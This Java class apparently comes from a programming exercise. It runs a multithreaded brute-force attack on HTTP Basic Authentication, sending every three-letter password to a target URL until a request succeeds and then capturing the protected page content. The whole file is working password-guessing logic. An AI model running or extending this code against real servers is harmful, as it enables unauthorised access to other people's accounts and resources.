package java.httputils;

import java.io.IOException;
import java.net.MalformedURLException;
import java.sql.Timestamp;


public class RunnableBruteForce extends BruteForce implements Runnable
{
    protected int rangeStart, rangeEnd;
    protected boolean stop = false;
    
    public RunnableBruteForce()
    {
        super();
    }

    
    public void run()
    {
        process();
    }

    public static void main(String[] args)
    {
    }
    
    public int getRangeEnd()
    {
        return rangeEnd;
    }

    
    public int getRangeStart()
    {
        return rangeStart;
    }

    
    public void setRangeEnd(int i)
    {
        rangeEnd = i;
    }

    
    public void setRangeStart(int i)
    {
        rangeStart = i;
    }

    
    public boolean isStop()
    {
        return stop;
    }

    
    public void setStop(boolean b)
    {
        stop = b;
    }

    public void process()
    {
        String password = "";
        
        System.out.println(Thread.currentThread().getName() +
                            "->  workload: " +
                            this.letters[getRangeStart()] + "  " +
                            this.letters[getRangeEnd() - 1]);
        setStart(new Timestamp(System.currentTimeMillis()));

        for (int i = getRangeStart();
            i < getRangeEnd();
            i++)
        {
            System.out.println(Thread.currentThread().getName() +
                    "-> Trying words beginning with: " +
                    letters[i]);
            for (int i2 = 0;
                i2 < letters.length;
                i2++)
            {
                for (int i3 = 0;
                    i3 < letters.length;
                    i3++)
                {
                    if (isStop())
                    {
                        return;
                    }
                    try
                    {
                        char [] arr = new char [] {letters[i], letters[i2], letters[i3]};
                        String pwd = new String(arr);
                        
                        if (Thread.currentThread().getName().equals("Thread-1") && pwd.equals("bad"))
                        {
                            System.out.println(Thread.currentThread().getName() +
                                   "-> Trying password: " +
                                    pwd);
                        }
                        attempts++;

                        BasicAuthHttpRequest req =
                            new BasicAuthHttpRequest(
                                getURL(),
                                getUserName(),
                                pwd);
                        System.out.println("Got the password");
                        setPassword(pwd);
                        setEnd(new Timestamp(System.currentTimeMillis()));
                        setContent(req.getContent().toString());

                        
                        this.setChanged();
                        this.notifyObservers(this.getContent());
                        return;
                    }
                    catch (MalformedURLException e)
                    {
                        e.printStackTrace();
                        return;
                    }
                    catch (IOException e)
                    {

                    }
                }
            }
        }

        
        setEnd(new Timestamp(System.currentTimeMillis()));
    }

}
